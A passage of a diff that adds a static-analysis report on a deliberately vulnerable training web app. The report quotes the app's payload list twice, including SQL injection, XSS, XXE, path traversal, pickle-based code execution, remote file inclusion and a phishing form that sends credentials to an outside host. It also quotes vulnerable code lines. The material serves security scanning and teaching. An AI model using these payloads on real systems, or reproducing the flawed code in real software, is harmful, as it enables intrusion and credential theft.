\"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "56a3d1743f5b96a16147c608c467ae2ea2741410df8f3a936e6f33fa357c2c37b7906769a3c183b485fd1be666a89090ff29c38b7900f0f35ffb95af73d23872_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "0f6a58da-fc89-3441-bf63-0e3616944d81",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 9794,
+                  "snippet": {
+                    "text": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "5a9f93aace5af11a9887044659983addbf7d674037a097b570a752bf7d8d6922e7f3c6ec633206396893673f645646488726b16f5bb99d7a1ada9bcf065e07a8_2"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "f6afeea3-174f-325a-bb0b-16ba64b11973",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 30,
+                  "startColumn": 21,
+                  "endLine": 30,
+                  "endColumn": 109,
+                  "snippet": {
+                    "text": "                    cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "8467a3d9a75b87f37434b6ebc5fd517b9161c4f782725ee3e4637382843e08ac770ee308d970e19bfc86ce7e119c4bc2267c20c951de8db7e64eb4d35b260ede_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "37491dc5-25cc-3c02-8fd9-42ebb7971b86",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities.\nWhen unpickling, the serialized data could be manipulated to run arbitrary code.\nInstead, consider serializing the relevant data as JSON or a similar text-based\nserialization format.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 35,
+                  "startColumn": 35,
+                  "endLine": 35,
+                  "endColumn": 74,
+                  "snippet": {
+                    "text": "                    content = str(pickle.loads(params[\"object\"].encode()))"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "009e44dbc5e9730d8a7a647cd7968223a18c1666a2f29744d59df54a622349d49beae4d03c07ffd00de2d696c42c7fedd39bdce77694aa3255dc2c08bb3503fd_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "5c230ecf-7b83-33d5-a905-45c0847c9c04",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 37,
+                  "startColumn": 112,
+                  "endLine": 37,
+                  "endColumn": 150,
+                  "snippet": {
+                    "text": "                    content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "7fccff98adbb93a34ae377c2d7ef67de84a59f15556ab8420a4a21e0021ad5e7e1bbe655af2d539a8803e02df04bd2b212ba89d7af3f540a81f73a5ce35c4159_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "5712df5b-8d86-3a3a-8530-50dca0cb6f8b",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Regex `r\"(v<b>)[^<]+(</b>)\"` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 33,
+                  "startColumn": 32,
+                  "endLine": 33,
+                  "endColumn": 105,
+                  "snippet": {
+                    "text": "                    content += re.sub(r\"(v<b>)[^<]+(</b>)\", r\"\\g<1>%s\\g<2>\" % params[\"v\"], HTML_POSTFIX)"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "1ac5e00cc45ebea21ba9f3f74f1d7cade71f263ca6be05f4808eaf098dcf8503b0ba99afffa6032d8b6cb9f8ca99b3fef58509331c4c66d2c31910b674ae30ad_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "94fd16b6-dcba-3658-ad4b-83e46673ac6a",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected subprocess function 'run' without a static string. If this data can be\ncontrolled by a malicious actor, it may be an instance of command injection.\nAudit the use of this call to ensure it is not controllable by an external resource.\nYou may consider using 'shlex.escape()'.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 39,
+                  "startColumn": 31,
+                  "endLine": 39,
+                  "endColumn": 173,
+                  "snippet": {
+                    "text": "                    content = subprocess.run(\"nslookup \" + params[\"domain\"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, text=True).stdout"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "560c6f24ca0b65698f5224b2de6a2836644cb6ead83e9304513e826296364835040348f889b328c4e7cdc4da747da2625cf52a76d68e8c266eed3cec93559e70_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "8172b7eb-bdc6-33a8-86ac-12addbb9d54b",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 41,
+                  "startColumn": 51,
+                  "endLine": 41,
+                  "endColumn": 61,
+                  "snippet": {
+                    "text": "                    content = lxml.etree.tostring(lxml.etree.parse(io.BytesIO(params[\"xml\"].encode()), lxml.etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)), pretty_print=True).decode()"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "56a3d1743f5b96a16147c608c467ae2ea2741410df8f3a936e6f33fa357c2c37b7906769a3c183b485fd1be666a89090ff29c38b7900f0f35ffb95af73d23872_3"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "f76c137d-b83b-3c9a-a2c5-e30bd8b70d0b",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 43,
+                  "startColumn": 29,
+                  "endLine": 43,
+                  "endColumn": 39,
+                  "snippet": {
+                    "text": "                    found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(\".//user[name/text()='%s']\" % params[\"name\"])"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "56a3d1743f5b96a16147c608c467ae2ea2741410df8f3a936e6f33fa357c2c37b7906769a3c183b485fd1be666a89090ff29c38b7900f0f35ffb95af73d23872_5"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "6df1271b-061a-3246-9172-27c2bf05d7a9",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 50,
+                  "startColumn": 25,
+                  "endLine": 50,
+                  "endColumn": 124,
+                  "snippet": {
+                    "text": "                        cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "bce140e78e6579cdba141cbaa11f840cb8f1a03daa447e1e268fe2227fa52f0a25b1210fd01d7f2efc8d5eabcb6adbbc3c2467ed95ad7b554605a788c4e5cc53_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "e6a4e9ae-e0e4-30f3-abb4-f6de8983c783",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 56,
+                  "startColumn": 154,
+                  "endLine": 56,
+                  "endColumn": 195,
+                  "snippet": {
+                    "text": "                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "7fccff98adbb93a34ae377c2d7ef67de84a59f15556ab8420a4a21e0021ad5e7e1bbe655af2d539a8803e02df04bd2b212ba89d7af3f540a81f73a5ce35c4159_1"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "082e610a-0d18-3d29-88b3-a43458ace8b0",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 56,
+                  "startColumn": 1,
+                  "endLine": 56,
+                  "endColumn": 401,
+                  "snippet": {
+                    "text": "                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
